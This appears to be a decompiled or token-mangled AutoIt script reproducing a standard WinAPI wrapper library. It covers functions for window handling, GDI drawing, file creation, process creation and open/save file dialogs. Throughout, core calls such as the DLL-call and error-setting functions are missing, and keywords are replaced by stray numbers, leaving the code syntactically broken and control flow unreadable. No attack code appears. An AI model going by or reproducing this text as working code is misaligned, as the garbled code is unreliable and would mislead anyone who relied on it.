($aresult[0], 0, "The buffer pointed to by the lpstrFile member of the OPENFILENAME structure is too small for the file name specified by the user." & @LF & "The first two bytes of the lpstrFile buffer contain an integer value specifying the size, in TCHARs, required to receive the full name.")
$fnerr_invalidfilename
($aresult[0], 0, "A file name is invalid.")
$fnerr_subclassfailure
($aresult[0], 0, "An attempt to subclass a list box failed because sufficient memory was not available.")


(@error, @extended, "0x" & ($aresult[0]))

_winapi_copyicon($hicon)
$aresult = ("user32.dll", "handle", "CopyIcon", "handle", $hicon)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_createbitmap($iwidth, $iheight, $iplanes = 1, $ibitsperpel = 1, $pbits = 0)
$aresult = ("gdi32.dll", "handle", "CreateBitmap", "int", $iwidth, "int", $iheight, "uint", $iplanes, "uint", $ibitsperpel, "ptr", $pbits)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_createcompatiblebitmap($hdc, $iwidth, $iheight)
$aresult = ("gdi32.dll", "handle", "CreateCompatibleBitmap", "handle", $hdc, "int", $iwidth, "int", $iheight)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_createcompatibledc($hdc)
$aresult = ("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $hdc)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_createevent($pattributes = 0, $bmanualreset = 39, $binitialstate = 39, $sname = "")
$snametype = "wstr"
$sname = ""5
$sname = 0
$snametype = "ptr"

$aresult = ("kernel32.dll", "handle", "CreateEventW", "ptr", $pattributes, "bool", $bmanualreset, "bool", $binitialstate, $snametype, $sname)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_createfile($sfilename, $icreation, $iaccess = 4, $ishare = 0, $iattributes = 0, $psecurity = 0)
$ida = 0, $ism = 0, $icd = 0, $ifa = 0
($iaccess, 1) <> 05$ida = ($ida, $generic_execute)
($iaccess, 2) <> 05$ida = ($ida, $generic_read)
($iaccess, 4) <> 05$ida = ($ida, $generic_write)
($ishare, 1) <> 05$ism = ($ism, $file_share_delete)
($ishare, 2) <> 05$ism = ($ism, $file_share_read)
($ishare, 4) <> 05$ism = ($ism, $file_share_write)
$icreation

$icd = $create_new

$icd = $create_always

$icd = $open_existing

$icd = $open_always

$icd = $truncate_existing

($iattributes, 1) <> 05$ifa = ($ifa, $file_attribute_archive)
($iattributes, 2) <> 05$ifa = ($ifa, $file_attribute_hidden)
($iattributes, 4) <> 05$ifa = ($ifa, $file_attribute_readonly)
($iattributes, 8) <> 05$ifa = ($ifa, $file_attribute_system)
$aresult = ("kernel32.dll", "handle", "CreateFileW", "wstr", $sfilename, "dword", $ida, "dword", $ism, "ptr", $psecurity, "dword", $icd, "dword", $ifa, "ptr", 0)
@error($aresult[0] = $invalid_handle_value)534(@error, @extended, 0)
$aresult[0]

_winapi_createfont($iheight, $iwidth, $iescape = 0, $iorientn = 0, $iweight = $__winapiconstant_fw_normal, $bitalic = 40, $bunderline = 40, $bstrikeout = 40, $icharset = $__winapiconstant_default_charset, $ioutputprec = $__winapiconstant_out_default_precis, $iclipprec = $__winapiconstant_clip_default_precis, $iquality = $__winapiconstant_default_quality, $ipitch = 0, $sface = "Arial")
$aresult = ("gdi32.dll", "handle", "CreateFontW", "int", $iheight, "int", $iwidth, "int", $iescape, "int", $iorientn, "int", $iweight, "dword", $bitalic, "dword", $bunderline, "dword", $bstrikeout, "dword", $icharset, "dword", $ioutputprec, "dword", $iclipprec, "dword", $iquality, "dword", $ipitch, "wstr", $sface)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_createfontindirect($tlogfont)
$aresult = ("gdi32.dll", "handle", "CreateFontIndirectW", "struct*", $tlogfont)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_createpen($ipenstyle, $iwidth, $ncolor)
$aresult = ("gdi32.dll", "handle", "CreatePen", "int", $ipenstyle, "int", $iwidth, "INT", $ncolor)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_createprocess($sappname, $scommand, $psecurity, $pthread, $binherit, $iflags, $penviron, $sdir, $pstartupinfo, $pprocess)
$tcommand = 0
$sappnametype = "wstr", $sdirtype = "wstr"
$sappname = ""5
$sappnametype = "ptr"
$sappname = 0

$scommand <> ""5
$tcommand = ("wchar Text[" & 260 + 1 & "]")
($tcommand, "Text", $scommand)

$sdir = ""5
$sdirtype = "ptr"
$sdir = 0

$aresult = ("kernel32.dll", "bool", "CreateProcessW", $sappnametype, $sappname, "struct*", $tcommand, "ptr", $psecurity, "ptr", $pthread, "bool", $binherit, "dword", $iflags, "ptr", $penviron, $sdirtype, $sdir, "ptr", $pstartupinfo, "ptr", $pprocess)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_createrectrgn($ileftrect, $itoprect, $irightrect, $ibottomrect)
$aresult = ("gdi32.dll", "handle", "CreateRectRgn", "int", $ileftrect, "int", $itoprect, "int", $irightrect, "int", $ibottomrect)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_createroundrectrgn($ileftrect, $itoprect, $irightrect, $ibottomrect, $iwidthellipse, $iheightellipse)
$aresult = ("gdi32.dll", "handle", "CreateRoundRectRgn", "int", $ileftrect, "int", $itoprect, "int", $irightrect, "int", $ibottomrect, "int", $iwidthellipse, "int", $iheightellipse)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_createsolidbitmap($hwnd, $icolor, $iwidth, $iheight, $brgb = 1)
$hdc = _winapi_getdc($hwnd)
$hdestdc = _winapi_createcompatibledc($hdc)
$hbitmap = _winapi_createcompatiblebitmap($hdc, $iwidth, $iheight)
$hold = _winapi_selectobject($hdestdc, $hbitmap)
$trect = ($tagrect)
($trect, 1, 0)
($trect, 2, 0)
($trect, 3, $iwidth)
($trect, 4, $iheight)
$brgb5
$icolor = (($icolor, 65280), (($icolor, 255), -16), (($icolor, 16711680), 16))

$hbrush = _winapi_createsolidbrush($icolor)
_winapi_fillrect($hdestdc, $trect, $hbrush)5
_winapi_deleteobject($hbitmap)
$hbitmap = 0

_winapi_deleteobject($hbrush)
_winapi_releasedc($hwnd, $hdc)
_winapi_selectobject($hdestdc, $hold)
_winapi_deletedc($hdestdc)
$hbitmap534(1, 0, 0)
$hbitmap

_winapi_createsolidbrush($ncolor)
$aresult = ("gdi32.dll", "handle", "CreateSolidBrush", "INT", $ncolor)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_createwindowex($iexstyle, $sclass, $sname, $istyle, $ix, $iy, $iwidth, $iheight, $hparent, $hmenu = 0, $hinstance = 0, $pparam = 0)
$hinstance = 05$hinstance = _winapi_getmodulehandle("")
$aresult = ("user32.dll", "hwnd", "CreateWindowExW", "dword", $iexstyle, "wstr", $sclass, "wstr", $sname, "dword", $istyle, "int", $ix, "int", $iy, "int", $iwidth, "int", $iheight, "hwnd", $hparent, "handle", $hmenu, "handle", $hinstance, "ptr", $pparam)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_defwindowproc($hwnd, $imsg, $iwparam, $ilparam)
$aresult = ("user32.dll", "lresult", "DefWindowProc", "hwnd", $hwnd, "uint", $imsg, "wparam", $iwparam, "lparam", $ilparam)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_deletedc($hdc)
$aresult = ("gdi32.dll", "bool", "DeleteDC", "handle", $hdc)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_deleteobject($hobject)
$aresult = ("gdi32.dll", "bool", "DeleteObject", "handle", $hobject)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_destroyicon($hicon)
$aresult = ("user32.dll", "bool", "DestroyIcon", "handle", $hicon)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_destroywindow($hwnd)
$aresult = ("user32.dll", "bool", "DestroyWindow", "hwnd", $hwnd)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_drawedge($hdc, $prect, $iedgetype, $iflags)
$aresult = ("user32.dll", "bool", "DrawEdge", "handle", $hdc, "ptr", $prect, "uint", $iedgetype, "uint", $iflags)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_drawframecontrol($hdc, $prect, $itype, $istate)
$aresult = ("user32.dll", "bool", "DrawFrameControl", "handle", $hdc, "ptr", $prect, "uint", $itype, "uint", $istate)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_drawicon($hdc, $ix, $iy, $hicon)
$aresult = ("user32.dll", "bool", "DrawIcon", "handle", $hdc, "int", $ix, "int", $iy, "handle", $hicon)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_drawiconex($hdc, $ix, $iy, $hicon, $iwidth = 0, $iheight = 0, $istep = 0, $hbrush = 0, $iflags = 3)
$ioptions
$iflags

$ioptions = $di_mask

$ioptions = $di_image

$ioptions = $di_normal

$ioptions = $di_compat

$ioptions = $di_defaultsize

$ioptions = $di_nomirror

$aresult = ("user32.dll", "bool", "DrawIconEx", "handle", $hdc, "int", $ix, "int", $iy, "handle", $hicon, "int", $iwidth, "int", $iheight, "uint", $istep, "handle", $hbrush, "uint", $ioptions)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_drawline($hdc, $ix1, $iy1, $ix2, $iy2)
_winapi_moveto($hdc, $ix1, $iy1)
@error534(@error, @extended, 40)
_winapi_lineto($hdc, $ix2, $iy2)
@error534(@error + 10, @extended, 40)
9

_winapi_drawtext($hdc, $stext, 36$trect, $iflags)
$aresult = ("user32.dll", "int", "DrawTextW", "handle", $hdc, "wstr", $stext, "int", -1, "struct*", $trect, "uint", $iflags)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_duplicatehandle($hsourceprocesshandle, $hsourcehandle, $htargetprocesshandle, $idesiredaccess, $binherithandle, $ioptions)
$aresult = ("kernel32.dll", "bool", "DuplicateHandle", "handle", $hsourceprocesshandle, "handle", $hsourcehandle, "handle", $htargetprocesshandle, "handle*", 0, "dword", $idesiredaccess, "bool", $binherithandle, "dword", $ioptions)
@error23$aresult[0]534(@error, @extended, 0)
$aresult[4]

_winapi_enablewindow($hwnd, $benable = 39)
$aresult = ("user32.dll", "bool", "EnableWindow", "hwnd", $hwnd, "bool", $benable)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_enumdisplaydevices($sdevice, $idevnum)
$tname = 0, $iflags = 0, $adevice[5]
$sdevice <> ""5
$tname = ("wchar Text[" & ($sdevice) + 1 & "]")
($tname, "Text", $sdevice)

$tdevice = ($tagdisplay_device)
$idevice = ($tdevice)
($tdevice, "Size", $idevice)
$aret = ("user32.dll", "bool", "EnumDisplayDevicesW", "struct*", $tname, "dword", $idevnum, "struct*", $tdevice, "dword", 1)
@error23$aret[0]534(@error + 10, @extended, 0)
$in = ($tdevice, "Flags")
($in, $display_device_attached_to_desktop) <> 05$iflags = ($iflags, 1)
($in, $display_device_primary_device) <> 05$iflags = ($iflags, 2)
($in, $display_device_mirroring_driver) <> 05$iflags = ($iflags, 4)
($in, $display_device_vga_compatible) <> 05$iflags = ($iflags, 8)
($in, $display_device_removable) <> 05$iflags = ($iflags, 16)
($in, $display_device_modespruned) <> 05$iflags = ($iflags, 32)
$adevice[0] = 39
$adevice[1] = ($tdevice, "Name")
$adevice[2] = ($tdevice, "String")
$adevice[3] = $iflags
$adevice[4] = ($tdevice, "ID")
$adevice

_winapi_enumwindows($bvisible = 39, $hwnd = 41)
__winapi_enumwindowsinit()
$hwnd = 415$hwnd = _winapi_getdesktopwindow()
__winapi_enumwindowschild($hwnd, $bvisible)
$__g_awinlist_winapi

__winapi_enumwindowsadd($hwnd, $sclass = "")
$sclass = ""5$sclass = _winapi_getclassname($hwnd)
$__g_awinlist_winapi[0][0] += 1
$icount = $__g_awinlist_winapi[0][0]
$icount >= $__g_awinlist_winapi[0][1]5
$__g_awinlist_winapi[$icount + 64][2]
$__g_awinlist_winapi[0][1] += 64

$__g_awinlist_winapi[$icount][0] = $hwnd
$__g_awinlist_winapi[$icount][1] = $sclass

__winapi_enumwindowschild($hwnd, $bvisible = 39)
$hwnd = _winapi_getwindow($hwnd, $gw_child)
$hwnd <> 0
(3$bvisible)2_winapi_iswindowvisible($hwnd)5
__winapi_enumwindowsadd($hwnd)
__winapi_enumwindowschild($hwnd, $bvisible)

$hwnd = _winapi_getwindow($hwnd, $gw_hwndnext)


__winapi_enumwindowsinit()
$__g_awinlist_winapi[64][2]
$__g_awinlist_winapi[0][0] = 0
$__g_awinlist_winapi[0][1] = 64

_winapi_enumwindowspopup()
__winapi_enumwindowsinit()
$hwnd = _winapi_getwindow(_winapi_getdesktopwindow(), $gw_child)
$sclass
$hwnd <> 0
_winapi_iswindowvisible($hwnd)5
$sclass = _winapi_getclassname($hwnd)
$sclass = "#32768"5
__winapi_enumwindowsadd($hwnd)
$sclass = "ToolbarWindow32"5
__winapi_enumwindowsadd($hwnd)
$sclass = "ToolTips_Class32"5
__winapi_enumwindowsadd($hwnd)
$sclass = "BaseBar"5
__winapi_enumwindowschild($hwnd)


$hwnd = _winapi_getwindow($hwnd, $gw_hwndnext)

$__g_awinlist_winapi

_winapi_enumwindowstop()
__winapi_enumwindowsinit()
$hwnd = _winapi_getwindow(_winapi_getdesktopwindow(), $gw_child)
$hwnd <> 0
_winapi_iswindowvisible($hwnd)5__winapi_enumwindowsadd($hwnd)
$hwnd = _winapi_getwindow($hwnd, $gw_hwndnext)

$__g_awinlist_winapi

_winapi_expandenvironmentstrings($sstring)
$aresult = ("kernel32.dll", "dword", "ExpandEnvironmentStringsW", "wstr", $sstring, "wstr", "", "dword", 4096)
@error23$aresult[0]534(@error + 10, @extended, "")
$aresult[2]

_winapi_extracticonex($sfile, $iindex, $plarge, $psmall, $iicons)
$aresult = ("shell32.dll", "uint", "ExtractIconExW", "wstr", $sfile, "int", $iindex, "struct*", $plarge, "struct*", $psmall, "uint", $iicons)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_fatalappexit($smessage)
("kernel32.dll", "none", "FatalAppExitW", "uint", 0, "wstr", $smessage)
@error534(@error, @extended)

_winapi_fillrect($hdc, $prect, $hbrush)
$aresult
($hbrush)5
$aresult = ("user32.dll", "int", "FillRect", "handle", $hdc, "struct*", $prect, "handle", $hbrush)

$aresult = ("user32.dll", "int", "FillRect", "handle", $hdc, "struct*", $prect, "dword_ptr", $hbrush)

@error534(@error, @extended, 40)
$aresult[0]

_winapi_findexecutable($sfilename, $sdirectory = "")
$aresult = ("shell32.dll", "INT", "FindExecutableW", "wstr", $sfilename, "wstr", $sdirectory, "wstr", "")
@error534(@error, @extended, "")
$aresult[0] <= 32534(10, $aresult[0], "")
($aresult[0], $aresult[3])

_winapi_findwindow($sclassname, $swindowname)
$aresult = ("user32.dll", "hwnd", "FindWindowW", "wstr", $sclassname, "wstr", $swindowname)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_flashwindow($hwnd, $binvert = 39)
$aresult = ("user32.dll", "bool", "FlashWindow", "hwnd", $hwnd, "bool", $binvert)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_flashwindowex($hwnd, $iflags = 3, $icount = 3, $itimeout = 0)
$tflash = ($tagflashwinfo)
$iflash = ($tflash)
$imode = 0
($iflags, 1) <> 05$imode = ($imode, $flashw_caption)
($iflags, 2) <> 05$imode = ($imode, $flashw_tray)
($iflags, 4) <> 05$imode = ($imode, $flashw_timer)
($iflags, 8) <> 05$imode = ($imode, $flashw_timernofg)
($tflash, "Size", $iflash)
($tflash, "hWnd", $hwnd)
($tflash, "Flags", $imode)
($tflash, "Count", $icount)
($tflash, "Timeout", $itimeout)
$aresult = ("user32.dll", "bool", "FlashWindowEx", "struct*", $tflash)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_floattoint($nfloat)
$tfloat = ("float")
$tint = ("int", ($tfloat))
($tfloat, 1, $nfloat)
($tint, 1)

_winapi_flushfilebuffers($hfile)
$aresult = ("kernel32.dll", "bool", "FlushFileBuffers", "handle", $hfile)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_formatmessage($iflags, $psource, $imessageid, $ilanguageid, 36$pbuffer, $isize, $varguments)
$sbuffertype = "struct*"
($pbuffer)5$sbuffertype = "wstr"
$aresult = ("Kernel32.dll", "dword", "FormatMessageW", "dword", $iflags, "ptr", $psource, "dword", $imessageid, "dword", $ilanguageid, $sbuffertype, $pbuffer, "dword", $isize, "ptr", $varguments)
@error23$aresult[0]534(@error + 10, @extended, 0)
$sbuffertype = "wstr"5$pbuffer = $aresult[5]
$aresult[0]

_winapi_framerect($hdc, $prect, $hbrush)
$aresult = ("user32.dll", "int", "FrameRect", "handle", $hdc, "ptr", $prect, "handle", $hbrush)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_freelibrary($hmodule)
$aresult = ("kernel32.dll", "bool", "FreeLibrary", "handle", $hmodule)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_getancestor($hwnd, $iflags = 1)
$aresult = ("user32.dll", "hwnd", "GetAncestor", "hwnd", $hwnd, "uint", $iflags)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getasynckeystate($ikey)
$aresult = ("user32.dll", "short", "GetAsyncKeyState", "int", $ikey)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getbkmode($hdc)
$aresult = ("gdi32.dll", "int", "GetBkMode", "handle", $hdc)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getclassname($hwnd)
($hwnd)5$hwnd = ($hwnd)
$aresult = ("user32.dll", "int", "GetClassNameW", "hwnd", $hwnd, "wstr", "", "int", 4096)
@error23$aresult[0]534(@error, @extended, "")
($aresult[0], $aresult[2])

_winapi_getclientheight($hwnd)
$trect = _winapi_getclientrect($hwnd)
@error534(@error, @extended, 0)
($trect, "Bottom") - ($trect, "Top")

_winapi_getclientwidth($hwnd)
$trect = _winapi_getclientrect($hwnd)
@error534(@error, @extended, 0)
($trect, "Right") - ($trect, "Left")

_winapi_getclientrect($hwnd)
$trect = ($tagrect)
$aret = ("user32.dll", "bool", "GetClientRect", "hwnd", $hwnd, "struct*", $trect)
@error23$aret[0]534(@error + 10, @extended, 0)
$trect

_winapi_getcurrentprocess()
$aresult = ("kernel32.dll", "handle", "GetCurrentProcess")
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getcurrentprocessid()
$aresult = ("kernel32.dll", "dword", "GetCurrentProcessId")
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getcurrentthread()
$aresult = ("kernel32.dll", "handle", "GetCurrentThread")
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getcurrentthreadid()
$aresult = ("kernel32.dll", "dword", "GetCurrentThreadId")
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getcursorinfo()
$tcursor = ($tagcursorinfo)
$icursor = ($tcursor)
($tcursor, "Size", $icursor)
$aret = ("user32.dll", "bool", "GetCursorInfo", "struct*", $tcursor)
@error23$aret[0]534(@error + 10, @extended, 0)
$acursor[5]
$acursor[0] = 39
$acursor[1] = ($tcursor, "Flags") <> 0
$acursor[2] = ($tcursor, "hCursor")
$acursor[3] = ($tcursor, "X")
$acursor[4] = ($tcursor, "Y")
$acursor

_winapi_getdc($hwnd)
$aresult = ("user32.dll", "handle", "GetDC", "hwnd", $hwnd)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getdesktopwindow()
$aresult = ("user32.dll", "hwnd", "GetDesktopWindow")
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getdevicecaps($hdc, $iindex)
$aresult = ("gdi32.dll", "int", "GetDeviceCaps", "handle", $hdc, "int", $iindex)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getdibits($hdc, $hbmp, $istartscan, $iscanlines, $pbits, $pbi, $iusage)
$aresult = ("gdi32.dll", "int", "GetDIBits", "handle", $hdc, "handle", $hbmp, "uint", $istartscan, "uint", $iscanlines, "ptr", $pbits, "ptr", $pbi, "uint", $iusage)
@error534(@error, @extended, 40)
$aresult[0]

_winapi_getdlgctrlid($hwnd)
$aresult = ("user32.dll", "int", "GetDlgCtrlID", "hwnd", $hwnd)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getdlgitem($hwnd, $iitemid)
$aresult = ("user32.dll", "hwnd", "GetDlgItem", "hwnd", $hwnd, "int", $iitemid)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getfilesizeex($hfile)
$aresult = ("kernel32.dll", "bool", "GetFileSizeEx", "handle", $hfile, "int64*", 0)
@error23$aresult[0]534(@error, @extended, -1)
$aresult[2]

_winapi_getfocus()
$aresult = ("user32.dll", "hwnd", "GetFocus")
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getforegroundwindow()
$aresult = ("user32.dll", "hwnd", "GetForegroundWindow")
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getguiresources($iflag = 0, $hprocess = -1)
$hprocess = -15$hprocess = _winapi_getcurrentprocess()
$aresult = ("user32.dll", "dword", "GetGuiResources", "handle", $hprocess, "dword", $iflag)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_geticoninfo($hicon)
$tinfo = ($tagiconinfo)
$aret = ("user32.dll", "bool", "GetIconInfo", "handle", $hicon, "struct*", $tinfo)
@error23$aret[0]534(@error + 10, @extended, 0)
$aicon[6]
$aicon[0] = 39
$aicon[1] = ($tinfo, "Icon") <> 0
$aicon[2] = ($tinfo, "XHotSpot")
$aicon[3] = ($tinfo, "YHotSpot")
$aicon[4] = ($tinfo, "hMask")
$aicon[5] = ($tinfo, "hColor")
$aicon

_winapi_getlasterrormessage()
$ilasterror = _winapi_getlasterror()
$tbufferptr = ("ptr")
$ncount = _winapi_formatmessage(($format_message_allocate_buffer, $format_message_from_system), 0, $ilasterror, 0, $tbufferptr, 0, 0)
@error534(@error, 0, "")
$stext = ""
$pbuffer = ($tbufferptr, 1)
$pbuffer5
$ncount > 05
$tbuffer = ("wchar[" & ($ncount + 1) & "]", $pbuffer)
$stext = ($tbuffer, 1)

_winapi_localfree($pbuffer)

$stext

_winapi_getlayeredwindowattributes($hwnd, 36$itranscolor, 36$itransparency, $bcolorref = 40)
$itranscolor = -1
$itransparency = -1
$aresult = ("user32.dll", "bool", "GetLayeredWindowAttributes", "hwnd", $hwnd, "INT*", $itranscolor, "byte*", $itransparency, "dword*", 0)
@error23$aresult[0]534(@error, @extended, 0)
$bcolorref5
$aresult[2] = (($aresult[2], 3, 1) & ($aresult[2], 2, 1) & ($aresult[2], 1, 1))

$itranscolor = $aresult[2]
$itransparency = $aresult[3]
$aresult[4]

_winapi_getmodulehandle($smodulename)
$smodulenametype = "wstr"
$smodulename = ""5
$smodulename = 0
$smodulenametype = "ptr"

$aresult = ("kernel32.dll", "handle", "GetModuleHandleW", $smodulenametype, $smodulename)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getmousepos($btoclient = 40, $hwnd = 0)
$imode = ("MouseCoordMode", 1)
$apos = ()
("MouseCoordMode", $imode)
$tpoint = ($tagpoint)
($tpoint, "X", $apos[0])
($tpoint, "Y", $apos[1])
$btoclient13_winapi_screentoclient($hwnd, $tpoint)534(@error + 20, @extended, 0)
$tpoint

_winapi_getmouseposx($btoclient = 40, $hwnd = 0)
$tpoint = _winapi_getmousepos($btoclient, $hwnd)
@error534(@error, @extended, 0)
($tpoint, "X")

_winapi_getmouseposy($btoclient = 40, $hwnd = 0)
$tpoint = _winapi_getmousepos($btoclient, $hwnd)
@error534(@error, @extended, 0)
($tpoint, "Y")

_winapi_getobject($hobject, $isize, $pobject)
$aresult = ("gdi32.dll", "int", "GetObjectW", "handle", $hobject, "int", $isize, "ptr", $pobject)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getopenfilename($stitle = "", $sfilter = "All files (*.*)", $sinitaldir = ".", $sdefaultfile = "", $sdefaultext = "", $ifilterindex = 1, $iflags = 0, $iflagsex = 0, $hwndowner = 0)
$ipathlen = 4096
$inulls = 0
$tofn = ($tagopenfilename)
$afiles[1] = [0]
$iflag = $iflags
$asflines = ($sfilter, "|")
$asfilter[$asflines[0] * 2 + 1]
$istart, $ifinal, $tagfilter
$asfilter[0] = $asflines[0] * 2
$i = 115$asflines[0]
$istart = ($asflines[$i], "(", 0, 1)
$ifinal = ($asflines[$i], ")", 0, -1)
$asfilter[$i * 2 - 1] = (($asflines[$i], $istart - 1), $str_stripleading + $str_striptrailing)
$asfilter[$i * 2] = ((($asflines[$i], $istart), ($asflines[$i]) - $ifinal + 1), $str_stripleading + $str_striptrailing)
$tagfilter &= "wchar[" & ($asfilter[$i * 2 - 1]) + 1 & "];wchar[" & ($asfilter[$i * 2]) + 1 & "];"

$ttitle = ("wchar Title[" & ($stitle) + 1 & "]")
$tinitialdir = ("wchar InitDir[" & ($sinitaldir) + 1 & "]")
$tfilter = ($tagfilter & "wchar")
$tpath = ("wchar Path[" & $ipathlen & "]")
$textn = ("wchar Extension[" & ($sdefaultext) + 1 & "]")
$i = 115$asfilter[0]
($tfilter, $i, $asfilter[$i])

($ttitle, "Title", $stitle)
($tinitialdir, "InitDir", $sinitaldir)
($tpath, "Path", $sdefaultfile)
($textn, "Extension", $sdefaultext)
($tofn, "StructSize", ($tofn))
($tofn, "hwndOwner", $hwndowner)
($tofn, "lpstrFilter", ($tfilter))
($tofn, "nFilterIndex", $ifilterindex)
($tofn, "lpstrFile", ($tpath))
($tofn, "nMaxFile", $ipathlen)
($tofn, "lpstrInitialDir", ($tinitialdir))
($tofn, "lpstrTitle", ($ttitle))
($tofn, "Flags", $iflag)
($tofn, "lpstrDefExt", ($textn))
($tofn, "FlagsEx", $iflagsex)
$ares = ("comdlg32.dll", "bool", "GetOpenFileNameW", "struct*", $tofn)
@error23$ares[0]534(@error + 10, @extended, $afiles)
($iflags, $ofn_allowmultiselect) = $ofn_allowmultiselect($iflags, $ofn_explorer) = $ofn_explorer5
$x = 115$ipathlen
($tpath, "Path", $x) = (0)5
($tpath, "Path", "|", $x)
$inulls += 1

$inulls = 0

$inulls = 2518

($tpath, "Path", (0), $x - 1)
$afiles = (($tpath, "Path"), "|")
$afiles[0] = 1534__winapi_parsefiledialogpath(($tpath, "Path"))
(($tpath, "Path"), "|")
($iflags, $ofn_allowmultiselect) = $ofn_allowmultiselect5
$afiles = (($tpath, "Path"), " ")
$afiles[0] = 1534__winapi_parsefiledialogpath(($tpath, "Path"))
((($tpath, "Path"), " ", "|"), "|")

__winapi_parsefiledialogpath(($tpath, "Path"))


_winapi_getoverlappedresult($hfile, $poverlapped, 36$ibytes, $bwait = 40)
$aresult = ("kernel32.dll", "bool", "GetOverlappedResult", "handle", $hfile, "ptr", $poverlapped, "dword*", 0, "bool", $bwait)
@error23$aresult[0]534(@error, @extended, 40)
$ibytes = $aresult[3]
$aresult[0]

_winapi_getparent($hwnd)
$aresult = ("user32.dll", "hwnd", "GetParent", "hwnd", $hwnd)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getprocaddress($hmodule, $vname)
$stype = "str"
($vname)5$stype = "word"
$aresult = ("kernel32.dll", "ptr", "GetProcAddress", "handle", $hmodule, $stype, $vname)
@error23$aresult[0]534(@error, @extended, 0)
$aresult[0]

_winapi_getprocessaffinitymask($hprocess)
$aresult = ("kernel32.dll", "bool", "GetProcessAffinityMask", "handle", $hprocess, "dword_ptr*", 0, "dword_ptr*", 0)
@error23$aresult[0]534(@error + 10, @extended, 0)
$amask[3]
$amask[0] = 39
$amask[1] = $aresult[2]
$amask[2] = $aresult[3]
$amask

_winapi_getsavefilename($stitle = "", $sfilter = "All files (*.*)", $sinitaldir = ".", $sdefaultfile = "", $sdefaultext = "", $ifilterindex = 1, $iflags = 0, $iflagsex = 0, $hwndowner = 0)
$ipathlen = 4096
$tofn = ($tagopenfilename)
$afiles[1] = [0]
$iflag = $iflags
$asflines = ($sfilter, "|")
$asfilter[$asflines[0] * 2 + 1]
$istart, $ifinal, $tagfilter
$asfilter[0] = $asflines[0] * 2
$i = 115$asflines[0]
$istart = ($asflines[$i], "(", 0, 1)
$ifinal = ($asflines[$i], ")", 0, -1)
$asfilter[$i * 2 - 1] = (($asflines[$i], $istart - 1), $str_stripleading + $str_striptrailing)
$asfilter[$i * 2] = ((($asflines[$i], $istart), ($asflines[$i]) - $ifinal + 1), $str_stripleading + $str_striptrailing)
$tagfilter &= "wchar[" & ($asfilter[$i * 2 - 1]) + 1 & "];wchar[" & ($asfilter[$i * 2]) + 1 & "];"

$ttitle = ("wchar Title[" & ($stitle) + 1 & "]")
$tinitialdir = ("wchar InitDir[" & ($sinitaldir) + 1 & "]")
$tfilter = ($tagfilter & "wchar")
$tpath = ("wchar Path[" & $ipathlen & "]")
$textn = ("wchar Extension[" & ($sdefaultext) + 1 & "]")
$i = 115$asfilter[0]
($tfilter, $i, $asfilter[$i])

($ttitle, "Title", $stitle)
($tinitialdir, "InitDir", $sinitaldir)
($tpath, "Path", $sdefaultfile)
($textn, "Extension", $sdefaultext)
($tofn, "StructSize", ($tofn))
($tofn, "hwndOwner", $hwndowner)
($tofn, "lpstrFilter", ($tfilter))
($tofn, "nFilterIndex", $ifilterindex)
($tofn, "lpstrFile", ($tpath))
($tofn, "nMaxFile", $ipathlen)
($tofn, "lpstrInitialDir", ($tinitialdir))
($tofn, "lpstrTitle", ($ttitle))
($tofn, "Flags", $iflag)
($tofn, "lpstrDefExt", ($textn))
($tofn, "FlagsEx", $iflagsex)
$ares = ("comdlg32.dll", "bool", "GetSaveFileNameW", "struct*", $tofn)
@error23$ares[0]534(@error + 10, @extended, $afiles)
__winapi_parsefiledialogpath(($tpath, "Path"))

_winapi_getstockobject($iobject)
$aresult = ("gdi32.dll", "handle", "GetStockObject", "int", $iobject)
@error534(@error, @extended, 0)
$aresult[0]

_winapi_getstdhandle($istdhandle)
$istdhandle < 02$istdhandle > 2534(2, 0, -1)
0$ahandle[3] = [-10, -11, -12]
$aresult = ("kernel32.dll", "handle", "GetStdHandle", "dword", $ahandle[$istdhandle])
@error534(@error, @extended, -1)
$aresult[0]

_winapi_getsyscolor($iindex)
